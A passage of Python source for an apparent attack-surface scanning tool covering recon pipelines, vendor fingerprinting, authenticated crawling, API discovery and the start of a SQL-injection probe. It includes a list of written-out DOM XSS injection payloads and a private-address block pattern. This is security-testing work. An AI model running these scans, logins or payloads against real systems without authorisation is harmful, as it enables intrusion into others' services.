        "google": "Google Workspace", "googlemail": "Google Workspace",
        "outlook": "Microsoft 365", "protection.outlook": "Microsoft 365",
        "pphosted": "Proofpoint", "mimecast": "Mimecast",
        "barracuda": "Barracuda", "messagelabs": "Symantec",
        "zoho": "Zoho Mail", "secureserver": "GoDaddy",
        "emailsrvr": "Rackspace", "postmarkapp": "Postmark",
        "mailgun": "Mailgun", "sendgrid": "SendGrid",
        "amazonaws": "Amazon SES", "forcepoint": "Forcepoint",
    }
    for mx in mx_records:
        for pattern, name in providers.items():
            if pattern in mx.lower():
                return name
    return "Unknown"


# =========================================================================
# Third-Party Vendor Intelligence
# =========================================================================

VENDOR_PATTERNS: Dict[str, Dict[str, str]] = {
    "google-analytics.com": {"name": "Google Analytics", "category": "analytics"},
    "googletagmanager.com": {"name": "Google Tag Manager", "category": "analytics"},
    "facebook.net": {"name": "Facebook Pixel", "category": "advertising"},
    "connect.facebook.net": {"name": "Facebook SDK", "category": "social"},
    "platform.twitter.com": {"name": "Twitter Widgets", "category": "social"},
    "cdn.linkedin.oribi.io": {"name": "LinkedIn Insight", "category": "analytics"},
    "snap.licdn.com": {"name": "LinkedIn", "category": "social"},
    "js.stripe.com": {"name": "Stripe", "category": "payment"},
    "js.braintreegateway.com": {"name": "Braintree", "category": "payment"},
    "www.paypal.com": {"name": "PayPal", "category": "payment"},
    "cdn.shopify.com": {"name": "Shopify", "category": "ecommerce"},
    "cdn.jsdelivr.net": {"name": "jsDelivr CDN", "category": "cdn"},
    "cdnjs.cloudflare.com": {"name": "Cloudflare CDN", "category": "cdn"},
    "unpkg.com": {"name": "unpkg", "category": "cdn"},
    "maxcdn.bootstrapcdn.com": {"name": "Bootstrap CDN", "category": "cdn"},
    "ajax.googleapis.com": {"name": "Google CDN", "category": "cdn"},
    "fonts.googleapis.com": {"name": "Google Fonts", "category": "fonts"},
    "use.typekit.net": {"name": "Adobe Fonts", "category": "fonts"},
    "sentry.io": {"name": "Sentry", "category": "monitoring"},
    "newrelic.com": {"name": "New Relic", "category": "monitoring"},
    "js.datadoghq.com": {"name": "Datadog RUM", "category": "monitoring"},
    "cdn.segment.com": {"name": "Segment", "category": "analytics"},
    "cdn.amplitude.com": {"name": "Amplitude", "category": "analytics"},
    "cdn.heapanalytics.com": {"name": "Heap", "category": "analytics"},
    "cdn.mxpnl.com": {"name": "Mixpanel", "category": "analytics"},
    "static.hotjar.com": {"name": "Hotjar", "category": "analytics"},
    "widget.intercom.io": {"name": "Intercom", "category": "support"},
    "js.hs-scripts.com": {"name": "HubSpot", "category": "marketing"},
    "static.zdassets.com": {"name": "Zendesk", "category": "support"},
    "embed.tawk.to": {"name": "Tawk.to", "category": "support"},
    "js.driftt.com": {"name": "Drift", "category": "support"},
    "recaptcha.net": {"name": "reCAPTCHA", "category": "security"},
    "challenges.cloudflare.com": {"name": "Cloudflare Turnstile", "category": "security"},
    "hcaptcha.com": {"name": "hCaptcha", "category": "security"},
    "optimize.google.com": {"name": "Google Optimize", "category": "testing"},
    "cdn.optimizely.com": {"name": "Optimizely", "category": "testing"},
    "js.chargebee.com": {"name": "Chargebee", "category": "billing"},
    "js.recurly.com": {"name": "Recurly", "category": "billing"},
    "maps.googleapis.com": {"name": "Google Maps", "category": "maps"},
    "api.mapbox.com": {"name": "Mapbox", "category": "maps"},
    "player.vimeo.com": {"name": "Vimeo", "category": "media"},
    "www.youtube.com": {"name": "YouTube", "category": "media"},
    "fast.wistia.com": {"name": "Wistia", "category": "media"},
    "sc-static.net": {"name": "Snapchat Pixel", "category": "advertising"},
    "analytics.tiktok.com": {"name": "TikTok Pixel", "category": "advertising"},
    "bat.bing.com": {"name": "Bing Ads", "category": "advertising"},
    "ads.linkedin.com": {"name": "LinkedIn Ads", "category": "advertising"},
    "ct.pinterest.com": {"name": "Pinterest Tag", "category": "advertising"},
    "akamaihd.net": {"name": "Akamai", "category": "cdn"},
    "cdn.cookielaw.org": {"name": "OneTrust", "category": "privacy"},
    "app.termly.io": {"name": "Termly", "category": "privacy"},
}


def run_third_party_intel(
    hosts: List[str], bridge: ASMBridge, timeout: int = 300,
) -> List[dict]:
    """Detect third-party vendors from response body, CSP headers, and JS sources."""
    if not _tool_available("httpx"):
        logger.error("httpx (PD) not installed"); return []

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hosts)); hosts_file = f.name
    try:
        cmd = [
            "httpx", "-l", hosts_file, "-silent", "-json",
            "-include-response", "-include-response-header",
        ]
        result = _run(cmd, timeout=timeout)
        findings = []
        for line in result.stdout.strip().splitlines():
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            host = data.get("host", data.get("input", ""))
            body = data.get("body", data.get("response", ""))
            raw_headers = data.get("header", {})

            csp = ""
            if raw_headers:
                for k, v in raw_headers.items():
                    if k.lower() == "content-security-policy":
                        csp = str(v)
                        break

            searchable = f"{body} {csp}"
            detected: Dict[str, Dict[str, str]] = {}

            for pattern, info in VENDOR_PATTERNS.items():
                if pattern in searchable:
                    detected[info["name"]] = info

            for vendor_name, vinfo in detected.items():
                bridge.submit_vendor(
                    host, vendor_name=vendor_name,
                    vendor_category=vinfo["category"],
                    detection_source="response-body+csp",
                    source="vendor-intel",
                )
            findings.append({
                "host": host,
                "vendors": list(detected.keys()),
                "count": len(detected),
            })
        bridge.flush()
        total = sum(f["count"] for f in findings)
        logger.info(f"vendor_intel: {total} vendors across {len(findings)} hosts")
        return findings
    finally:
        os.unlink(hosts_file)


# =========================================================================
# Full Recon Pipeline (11-phase Frogy 2.0 methodology)
# =========================================================================

def run_full_recon(domain: str, bridge: ASMBridge) -> dict:
    """Complete 11-phase pipeline: discovery → DNS → HTTP → ports → vulns →
    crawl → takeover → TLS → headers → mail → vendors."""
    logger.info(f"=== Full recon for {domain} ===")
    results = {"domain": domain}

    # Phase 1: Subdomain discovery — run subfinder, subfaster, and subcat for max coverage
    subs_subfinder = run_subfinder(domain, bridge)
    subs_subfaster = run_subfaster(domain, bridge)
    subs_subcat = run_subcat(domain, bridge)
    subs = list(set(subs_subfinder + subs_subfaster + subs_subcat))
    results["subdomains"] = len(subs)

    all_hosts = [domain] + subs

    # Phase 2: DNS resolution
    resolved = run_dnsx(all_hosts, bridge)
    results["resolved_hosts"] = len(resolved)

    # Phase 3: HTTP probing
    live = run_httpx(all_hosts[:500], bridge)
    results["live_hosts"] = len(live)
    live_urls = [h.get("url", "") for h in live if h.get("url")]
    live_hostnames = list({h.get("host", h.get("input", "")) for h in live if h.get("host") or h.get("input")})

    # Phase 4: Port scanning
    ips = list(set(resolved.values()))
    port_findings = []
    for ip in ips[:50]:
        port_findings.extend(run_naabu(ip, bridge, ports="top-1000"))
    results["open_ports"] = len(port_findings)

    # Phase 5: Vulnerability scanning
    vuln_findings = []
    for url in live_urls[:100]:
        vuln_findings.extend(run_nuclei(url, bridge))
    results["vulnerabilities"] = len(vuln_findings)

    # Phase 6: Web crawling
    crawled = []
    for url in live_urls[:20]:
        crawled.extend(run_katana(url, bridge, depth=2))
    results["urls_discovered"] = len(crawled)

    # Phase 7: Subdomain takeover detection
    takeover_findings = run_subdomain_takeover(all_hosts[:200], bridge)
    results["takeover_candidates"] = sum(
        1 for f in takeover_findings if f.get("status") in ("confirmed", "potential")
    )

    # Phase 8: TLS deep analysis
    tls_findings = run_tlsx(live_hostnames[:200], bridge)
    results["tls_analyzed"] = len(tls_findings)
    results["tls_poor_grades"] = sum(
        1 for f in tls_findings if f.get("grade") in ("D", "F")
    )

    # Phase 9: Security header analysis
    header_findings = run_security_headers(live_hostnames[:200], bridge)
    results["headers_analyzed"] = len(header_findings)
    results["headers_missing_critical"] = sum(
        1 for f in header_findings if len(f.get("missing", [])) >= 3
    )

    # Phase 10: Mail infrastructure mapping
    root_domains = list({domain})
    mail_findings = run_mail_intel(root_domains, bridge)
    results["mail_analyzed"] = len(mail_findings)
    results["mail_avg_risk"] = (
        sum(f.get("risk_score", 0) for f in mail_findings) // max(len(mail_findings), 1)
    )

    # Phase 11: Third-party vendor intelligence
    vendor_findings = run_third_party_intel(live_hostnames[:50], bridge)
    results["vendors_detected"] = sum(f.get("count", 0) for f in vendor_findings)

    logger.info(f"=== Recon complete: {json.dumps(results, indent=2)} ===")
    return results


# =========================================================================
# Playwright: Authenticated Browser Crawl
# =========================================================================

_API_PATH_HINTS = (
    "/api/", "/apis/", "/v1/", "/v2/", "/v3/", "/graphql", "/graphql/",
    "/rest/", "/rpc/", "/jsonrpc", "/webhook", "/webhooks/", "/socket.io/",
    "/ws/", "/wss/", "/oauth/", "/auth/", "/sso/", "/admin/", "/internal/",
)

_SENSITIVE_API_HINTS = (
    "admin", "internal", "private", "debug", "config", "settings", "billing",
    "invoice", "payment", "user", "users", "account", "accounts", "profile",
    "export", "download", "report", "token", "secret", "key", "credential",
)


def _is_probable_api_url(url: str, content_type: str = "") -> bool:
    parsed = urlparse(url)
    path = parsed.path.lower()
    ctype = (content_type or "").lower()
    if parsed.scheme in ("ws", "wss"):
        return True
    if any(hint in path for hint in _API_PATH_HINTS):
        return True
    if "application/json" in ctype or "graphql" in ctype:
        return True
    return path.endswith((".json", ".graphql"))


def _classify_api_url(url: str, content_type: str = "") -> str:
    parsed = urlparse(url)
    path = parsed.path.lower()
    ctype = (content_type or "").lower()
    if parsed.scheme in ("ws", "wss") or "websocket" in ctype or "/socket.io/" in path:
        return "websocket"
    if "graphql" in path or "graphql" in ctype:
        return "graphql"
    if "jsonrpc" in path:
        return "json-rpc"
    if path.endswith(".wsdl") or "soap" in ctype:
        return "soap"
    return "rest"


def _normalize_api_path(path: str) -> str:
    parts = []
    uuid_re = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
    for part in path.split("/"):
        if not part:
            continue
        if part.isdigit() or uuid_re.match(part):
            parts.append(":id")
        elif len(part) > 24 and re.match(r"^[A-Za-z0-9_-]+$", part):
            parts.append(":token")
        else:
            parts.append(part)
    return "/" + "/".join(parts)


def _api_sensitivity(url: str, params: List[str]) -> List[str]:
    parsed = urlparse(url)
    haystack = f"{parsed.path.lower()} {' '.join(p.lower() for p in params)}"
    return [hint for hint in _SENSITIVE_API_HINTS if hint in haystack]


def _extract_urls_from_text(text: str, base_url: str) -> List[str]:
    if not text:
        return []
    candidates = set()
    absolute_re = re.compile(r"""(?:https?:)?//[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]+""")
    relative_re = re.compile(r"""["'`](\/(?:api|apis|v[0-9]|graphql|rest|rpc|jsonrpc|webhook|ws|socket\.io|oauth|auth|admin|internal)[^"'`\s<>]*)""", re.I)
    for match in absolute_re.findall(text):
        url = "https:" + match if match.startswith("//") else match
        candidates.add(url)
    for match in relative_re.findall(text):
        candidates.add(urljoin(base_url, match))
    return sorted(candidates)


def run_api_surface_discovery(
    target_url: str,
    bridge: ASMBridge,
    timeout: int = 120,
    max_pages: int = 20,
) -> Dict[str, Any]:
    """Discover API endpoints from browser traffic, links, scripts, and response metadata.

    This is a blackbox-safe, Vespasian-style inventory pass: it observes what the
    app already requests and extracts API-like routes. It does not mutate state,
    brute force, or attempt authenticated authorization bypasses.
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        logger.error("playwright not installed")
        return {"success": False, "error": "playwright not installed", "endpoints": []}

    parsed_target = urlparse(target_url)
    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
    in_scope_hosts = {parsed_target.netloc}
    endpoint_map: Dict[str, Dict[str, Any]] = {}
    static_candidates: set = set()
    pages_seen: set = set()
    pages_to_visit: List[str] = [target_url]

    def _in_scope(url: str) -> bool:
        parsed = urlparse(url)
        return parsed.netloc in in_scope_hosts or url.startswith("/")

    def _record_endpoint(
        url: str,
        method: str = "GET",
        status: Optional[int] = None,
        content_type: str = "",
        source: str = "browser",
    ):
        if not url or not (url.startswith("http://") or url.startswith("https://") or url.startswith("ws")):
            return
        parsed = urlparse(url)
        if parsed.netloc not in in_scope_hosts:
            return
        params = sorted({name for name, _ in parse_qsl(parsed.query, keep_blank_values=True)})
        normalized_path = _normalize_api_path(parsed.path or "/")
        key = f"{method.upper()} {parsed.scheme}://{parsed.netloc}{normalized_path}"
        api_type = _classify_api_url(url, content_type)
        sensitive_hints = _api_sensitivity(url, params)

        if key not in endpoint_map:
            endpoint_map[key] = {
                "method": method.upper(),
                "url": url,
                "origin": f"{parsed.scheme}://{parsed.netloc}",
                "path": parsed.path or "/",
                "normalized_path": normalized_path,
                "api_type": api_type,
                "parameters": params,
                "status_codes": [],
                "content_types": [],
                "sources": [],
                "auth_hint": "unknown",
                "sensitive_hints": sensitive_hints,
            }
        endpoint = endpoint_map[key]
        endpoint["parameters"] = sorted(set(endpoint["parameters"]) | set(params))
        endpoint["sensitive_hints"] = sorted(set(endpoint["sensitive_hints"]) | set(sensitive_hints))
        if status is not None and status not in endpoint["status_codes"]:
            endpoint["status_codes"].append(status)
        if content_type and content_type not in endpoint["content_types"]:
            endpoint["content_types"].append(content_type)
        if source not in endpoint["sources"]:
            endpoint["sources"].append(source)
        if status in (401, 403):
            endpoint["auth_hint"] = "requires_auth"
        elif status is not None and 200 <= status < 400 and endpoint["auth_hint"] == "unknown":
            endpoint["auth_hint"] = "public_or_session_available"

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        context = browser.new_context(
            ignore_https_errors=True,
            user_agent=(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 "
                "AegisVanguard-API-Discovery/1.0"
            ),
        )
        page = context.new_page()

        def _on_request(request):
            url = request.url
            if _in_scope(url) and _is_probable_api_url(url):
                _record_endpoint(url, method=request.method, source="request")

        def _on_response(response):
            url = response.url
            headers = response.headers or {}
            content_type = headers.get("content-type", "")
            if _in_scope(url) and _is_probable_api_url(url, content_type):
                _record_endpoint(
                    url,
                    method=response.request.method,
                    status=response.status,
                    content_type=content_type.split(";")[0],
                    source="response",
                )

        page.on("request", _on_request)
        page.on("response", _on_response)

        deadline = time.time() + max(10, timeout)
        while pages_to_visit and len(pages_seen) < max_pages and time.time() < deadline:
            url = pages_to_visit.pop(0)
            if url in pages_seen:
                continue
            pages_seen.add(url)
            try:
                page.goto(url, wait_until="networkidle", timeout=20000)
            except PWTimeout:
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
                except Exception as e:
                    logger.debug(f"api discovery navigation failed ({url[:80]}): {e}")
                    continue
            except Exception as e:
                logger.debug(f"api discovery navigation failed ({url[:80]}): {e}")
                continue

            try:
                body = page.content()
                for candidate in _extract_urls_from_text(body, base_origin):
                    if _in_scope(candidate):
                        static_candidates.add(candidate)
                        if _is_probable_api_url(candidate):
                            _record_endpoint(candidate, source="html")

                links = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
                for link in links:
                    if _in_scope(link) and link not in pages_seen and len(pages_to_visit) < max_pages:
                        pages_to_visit.append(link)

                scripts = page.eval_on_selector_all("script[src]", "els => els.map(e => e.src)")
                for script_url in scripts[:30]:
                    if not _in_scope(script_url):
                        continue
                    static_candidates.add(script_url)
                    try:
                        resp = context.request.get(script_url, timeout=10000)
                        if resp.ok:
                            for candidate in _extract_urls_from_text(resp.text(), base_origin):
                                if _in_scope(candidate) and _is_probable_api_url(candidate):
                                    _record_endpoint(candidate, source="javascript")
                    except Exception:
                        continue
            except Exception as e:
                logger.debug(f"api discovery extraction failed ({url[:80]}): {e}")

        browser.close()

    endpoints = sorted(
        endpoint_map.values(),
        key=lambda item: (item["api_type"], item["normalized_path"], item["method"]),
    )

    for endpoint in endpoints:
        host = urlparse(endpoint["url"]).hostname or parsed_target.hostname or target_url
        severity = "medium" if endpoint.get("sensitive_hints") and endpoint.get("auth_hint") == "public_or_session_available" else "info"
        bridge.submit_finding(Finding(
            type="api_endpoint",
            source="api-surface-discovery",
            target=host,
            host=host,
            url=endpoint["url"],
            title=f"API endpoint discovered: {endpoint['method']} {endpoint['normalized_path']}",
            severity=severity,
            confidence="high" if endpoint.get("status_codes") else "medium",
            tags=["api", endpoint["api_type"], endpoint["auth_hint"]] + [
                f"sensitive:{hint}" for hint in endpoint.get("sensitive_hints", [])
            ],
            raw_data=endpoint,
        ))
        bridge.submit_url(endpoint["url"], source="api-surface-discovery")
    bridge.flush()

    summary = {
        "success": True,
        "target_url": target_url,
        "pages_observed": len(pages_seen),
        "endpoints": endpoints[:300],
        "endpoint_count": len(endpoints),
        "by_type": {},
        "sensitive_count": sum(1 for e in endpoints if e.get("sensitive_hints")),
        "auth_required_count": sum(1 for e in endpoints if e.get("auth_hint") == "requires_auth"),
        "public_or_session_available_count": sum(
            1 for e in endpoints if e.get("auth_hint") == "public_or_session_available"
        ),
    }
    for endpoint in endpoints:
        api_type = endpoint["api_type"]
        summary["by_type"][api_type] = summary["by_type"].get(api_type, 0) + 1
    logger.info(
        "api discovery: %d endpoints across %d pages for %s",
        len(endpoints), len(pages_seen), target_url,
    )
    return summary

def _playwright_try_login(page, username: str, password: str) -> bool:
    """Fill and submit a login form on the current page. Returns True if attempted."""
    try:
        # Common username/email field selectors, tried in order
        for sel in [
            "input[name='username']", "input[name='email']", "input[name='user']",
            "input[type='email']", "input[id*='user' i]", "input[id*='email' i]",
            "input[placeholder*='user' i]", "input[placeholder*='email' i]",
        ]:
            if page.locator(sel).count() > 0:
                page.fill(sel, username)
                break

        # Common password field selectors
        for sel in ["input[type='password']", "input[name='password']", "input[id*='pass' i]"]:
            if page.locator(sel).count() > 0:
                page.fill(sel, password)
                break

        # Submit button selectors
        for sel in [
            "button[type='submit']", "input[type='submit']",
            "button:has-text('Login')", "button:has-text('Sign in')",
            "button:has-text('Log in')", "button:has-text('Submit')",
        ]:
            if page.locator(sel).count() > 0:
                page.click(sel)
                page.wait_for_load_state("networkidle", timeout=10000)
                logger.info("playwright: login form submitted")
                return True
    except Exception as e:
        logger.warning(f"playwright: login attempt failed: {e}")
    return False


def run_playwright_crawl_authenticated(
    target_url: str,
    bridge: ASMBridge,
    username: str = "",
    password: str = "",
    timeout: int = 120,
) -> List[str]:
    """Browser-based crawl using Playwright/Chromium.

    Handles JS-rendered SPAs, dynamic routes, and optional authentication.
    Captures all in-scope URLs surfaced during real browser navigation, including
    routes that only appear after user interaction or JS execution.
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        logger.error("playwright not installed")
        return []

    parsed = urlparse(target_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    discovered_urls: List[str] = []
    visited: set = set()

    def _in_scope(url: str) -> bool:
        return isinstance(url, str) and url.startswith(base_origin)

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        context = browser.new_context(
            ignore_https_errors=True,
            user_agent=(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 "
                "AegisVanguard/1.0"
            ),
        )
        page = context.new_page()

        # Capture every in-scope network request as a discovered URL
        def _on_request(request):
            url = request.url
            if _in_scope(url) and url not in visited:
                visited.add(url)
                discovered_urls.append(url)
                bridge.submit_url(url, source="playwright")

        page.on("request", _on_request)

        try:
            page.goto(target_url, wait_until="networkidle", timeout=30000)
        except PWTimeout:
            try:
                page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
            except Exception as e:
                logger.warning(f"playwright: initial navigation failed: {e}")
                browser.close()
                return discovered_urls

        # Attempt login if credentials provided
        if username and password:
            _playwright_try_login(page, username, password)
            # Re-capture authenticated routes after login
            try:
                page.wait_for_load_state("networkidle", timeout=15000)
            except PWTimeout:
                pass

        # BFS link-following crawl (up to 3 depths, 20 links per level)
        to_visit = [target_url]
        for _ in range(3):
            next_batch: List[str] = []
            for url in to_visit[:20]:
                if url in visited:
                    continue
                try:
                    page.goto(url, wait_until="networkidle", timeout=20000)
                    visited.add(url)
                    links = page.eval_on_selector_all(
                        "a[href]", "els => els.map(e => e.href)"
                    )
                    for link in links:
                        if _in_scope(link) and link not in visited:
                            next_batch.append(link)
                            if link not in discovered_urls:
                                discovered_urls.append(link)
                                bridge.submit_url(link, source="playwright")
                except Exception:
                    pass
            if not next_batch:
                break
            to_visit = list(set(next_batch))

        browser.close()

    bridge.flush()
    logger.info(f"playwright crawl: {len(discovered_urls)} URLs on {target_url}")
    return discovered_urls


# =========================================================================
# Playwright: DOM XSS Testing
# =========================================================================

# Payloads that set a detectable window property on execution.
# Using a property marker avoids needing alert() which is blocked in some
# environments and avoids false positives from benign dialogs.
_DOM_XSS_PAYLOADS = [
    "<img src=x onerror=\"window.__vanguard_xss=document.location.href\">",
    "<svg/onload=\"window.__vanguard_xss=document.location.href\">",
    "\"><img src=x onerror=\"window.__vanguard_xss=document.location.href\">",
    "';window.__vanguard_xss=document.location.href;//",
    "<script>window.__vanguard_xss=document.location.href</script>",
    "<details open ontoggle=\"window.__vanguard_xss=document.location.href\">",
    "<iframe srcdoc=\"<script>parent.window.__vanguard_xss=document.location.href</script>\">",
]


def run_dom_xss_test(
    target_url: str,
    bridge: ASMBridge,
    params: str = "",
    timeout: int = 60,
) -> List[dict]:
    """Test for DOM-based XSS using Playwright — detects payloads that execute in the
    browser JS context but do not reflect in HTTP responses (missed by XSStrike/nuclei).

    Injects into URL fragments (#), query parameters, and common sink vectors.
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        logger.error("playwright not installed")
        return []

    parsed = urlparse(target_url)
    param_list = [p.strip() for p in params.split(",") if p.strip()] if params else []

    # Build test cases: fragment injection + per-parameter injection
    test_cases: List[dict] = []
    for payload in _DOM_XSS_PAYLOADS:
        test_cases.append({
            "url": f"{target_url}#{payload}",
            "method": "fragment",
            "payload": payload,
        })
        for param in param_list:
            sep = "&" if "?" in target_url else "?"
            test_cases.append({
                "url": f"{target_url}{sep}{param}={payload}",
                "method": f"param:{param}",
                "payload": payload,
            })

    findings: List[dict] = []

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        # Capture alert/confirm/prompt dialogs (classic XSS confirmation vector)
        triggered_dialogs: List[str] = []
        page.on("dialog", lambda d: (triggered_dialogs.append(d.message), d.dismiss()))

        for tc in test_cases[:40]:
            try:
                page.goto(tc["url"], wait_until="domcontentloaded", timeout=10000)
                page.wait_for_timeout(1200)

                hit = page.evaluate("() => window.__vanguard_xss || null")
                dialog_hit = triggered_dialogs[-1] if triggered_dialogs else None

                if hit or dialog_hit:
                    evidence = f"window.__vanguard_xss={hit}" if hit else f"dialog triggered: {dialog_hit}"
                    finding = {
                        "url": tc["url"],
                        "payload": tc["payload"],
                        "injection_method": tc["method"],
                        "confirmed": True,
                        "evidence": evidence,
                    }
                    findings.append(finding)
                    bridge.submit_vulnerability(
                        host=parsed.netloc,
                        title=f"DOM XSS: {parsed.netloc}",
                        severity="high",
                        source="playwright-xss",
                        url=tc["url"],
                        description=(
                            f"DOM-based XSS confirmed via Playwright. "
                            f"Injection method: {tc['method']}. "
                            f"Evidence: {evidence}"
                        ),
                        confidence="confirmed",
                        tags=["xss", "dom-xss", "playwright", "confirmed"],
                        raw_data={"poc": finding},
                    )
                    # Reset marker for next test
                    page.evaluate("() => { window.__vanguard_xss = undefined; }")
                    triggered_dialogs.clear()
            except Exception as e:
                logger.debug(f"DOM XSS test case error ({tc['url'][:80]}): {e}")

        browser.close()

    bridge.flush()
    logger.info(f"dom_xss_test: {len(findings)} confirmed findings on {target_url}")
    return findings


# =============================================================================
# Manual HTTP probing — send_http_request
# =============================================================================

def run_send_http_request(
    method: str,
    url: str,
    headers_json: str,
    body: str,
    follow_redirects: bool,
    bridge,
    timeout: int = 30,
) -> dict:
    """Send a single custom HTTP request and return status, headers, body, and redirect chain."""
    import json as _json
    import re as _re

    # Block private ranges — agents should use SSRF-specific tools for internal probing.
    _private = _re.compile(
        r"https?://(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|"
        r"localhost|::1|0\.0\.0\.0|0x7f|0177\.)",
        _re.IGNORECASE,
    )
    if _private.search(url):
        return {"error": "blocked: internal/loopback address not allowed via send_http_request"}

    try:
        headers = _json.loads(headers_json) if headers_json and headers_json.strip() else {}
    except (_json.JSONDecodeError, ValueError):
        return {"error": f"headers_json is not valid JSON: {headers_json[:200]}"}

    if not _tool_available("curl"):
        # Fallback to httpx if available
        try:
            import httpx
        except ImportError:
            return {"error": "neither curl nor httpx is available"}
        try:
            with httpx.Client(timeout=timeout, follow_redirects=follow_redirects, max_redirects=5) as client:
                resp = client.request(
                    method.upper(),
                    url,
                    headers=headers,
                    content=body.encode() if body else None,
                )
            return {
                "status": resp.status_code,
                "headers": dict(resp.headers),
                "body": resp.text[:8000],
                "elapsed_ms": round(resp.elapsed.total_seconds() * 1000) if resp.elapsed else None,
                "redirect_history": [str(r.url) for r in resp.history],
            }
        except Exception as e:
            return {"error": str(e)}

    # Build curl command
    t0 = time.time()
    cmd = ["curl", "-s", "-i", "-X", method.upper(), "--max-time", str(timeout)]
    if not follow_redirects:
        cmd.append("--no-location")
    else:
        cmd += ["-L", "--max-redirs", "5"]
    for k, v in headers.items():
        cmd += ["-H", f"{k}: {v}"]
    if body:
        cmd += ["-d", body]
    cmd.append(url)

    raw_result = _run(cmd, timeout=timeout + 5)
    elapsed_ms = round((time.time() - t0) * 1000)
    raw = raw_result.stdout if hasattr(raw_result, "stdout") else (raw_result or "")
    if not raw:
        return {"error": "empty response from curl", "elapsed_ms": elapsed_ms}

    # Parse status from first line
    lines = raw.split("\n")
    status = None
    for line in lines:
        if line.startswith("HTTP/"):
            try:
                status = int(line.split()[1])
            except (IndexError, ValueError):
                pass
            break

    # Find body after double CRLF
    separator = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
    parts = raw.split(separator, 1)
    resp_body = parts[1][:8000] if len(parts) > 1 else ""

    return {
        "status": status,
        "raw_headers": parts[0] if parts else "",
        "body": resp_body,
        "url": url,
        "elapsed_ms": elapsed_ms,
    }


# =============================================================================
# SQLi / XSS parameter probes (deterministic, no LLM spraying)
# =============================================================================

_SQL_ERROR_RE = re.compile(
    r"(?:SQL syntax|mysql_fetch|mysqli_|pg_query|PostgreSQL.*ERROR|"
    r"ORA-\d{5}|Microsoft OLE DB|ODBC SQL Server|SQLite3?::|"
    r"Unclosed quotation mark|quoted string not properly terminated|"
    r"You have an error in your SQL|SQLSTATE\[|JdbcSQLException|"
    r"org\.hibernate\.|PDOException|DB2 SQL error)",
    re.I,
)

_SQLI_PRIORITY_PARAMS = {
    "id", "user_id", "userid", "uid", "order_id", "product_id", "item_id",
    "page", "sort", "order", "filter", "category", "q", "query", "search",
    "keyword", "report", "from", "to", "start", "end", "limit", "offset",
    "select", "where", "name", "email", "username",
}


def _http_probe(
    method: str,
    url: str,
    body: str = "",
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 20,
) -> dict:
    """Lightweight timed HTTP probe used by SQLi/XSS canary scanners."""
    return run_send_http_request(
        method=method,
        url=url,
        headers_json=json.dumps(headers or {}),
        body=body,
        follow_redirects=True,
        bridge=None,  # type: ignore[arg-type]
        timeout=timeout,
    )


def _mutate_url_param(url: str, param: str, value: str) -> str:
    from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        pairs.append((param, value))
    else:
        pairs = [(k, value if k == param else v) for k, v in pairs]
    return urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))


def _mutate_body_param(body: str, param: str, value: str, content_type: str) -> str:
    if "json" in (content_type or "").lower():
        try:
            obj = json.loads(body) if body else {}
            if isinstance(obj, dict) and param in obj:
                obj[param] = value
                return json.dumps(obj)
        except json.JSONDecodeError:
            pass
    # form-urlencoded
    pairs = parse_qsl(body or "", keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        pairs.append((param, value))
    else:
        pairs = [(k, value if k == param else v) for k, v in pairs]
    from urllib.parse import urlencode
    return urlencode(pairs, doseq=True)


def run_probe_sqli_params(
    target_url: str,
    bridge: ASMBridge,
    method: str = "GET",
    body: str = "",
    params: str = "",
    headers_json: str = "{}",
    timeout: int = 25,
) -> dict:
    """Differential SQLi probe across URL/body parameters.

    For each param: baseline → quote error → boolean true/false → short time delay.
    Returns structured candidates ready for sqlmap confirmation.
    """
    try:
        headers = json.loads(headers_json) if headers_json else {}
    except json.JSONDecodeError:
        headers = {}
    content_type = ""
    for k, v in list(headers.items()):
        if k.lower() == "content-type":
            content_type = v
            break
    if body and not content_type:
        content_type = "application/x-www-form-urlencoded"
        headers["Content-Type"] = content_type

    parsed = urlparse(target_url)
    query_params = [k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)]
    body_params = [k for k, _ in parse_qsl(body or "", keep_blank_values=True)]
    if "json" in content_type.lower() and body:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                body_params = list(obj.keys())
        except json.JSONDecodeError:
            pass

    if params.strip():
        param_list = [p.strip() for p in params.split(",") if p.strip()]
    else:
        param_list = list(dict.fromkeys(query_params + body_params))

    # Prioritize high-signal names
    param_list.sort(key=lambda p: (0 if p.lower() in _SQLI_PRIORITY_PARAMS else 1, p))
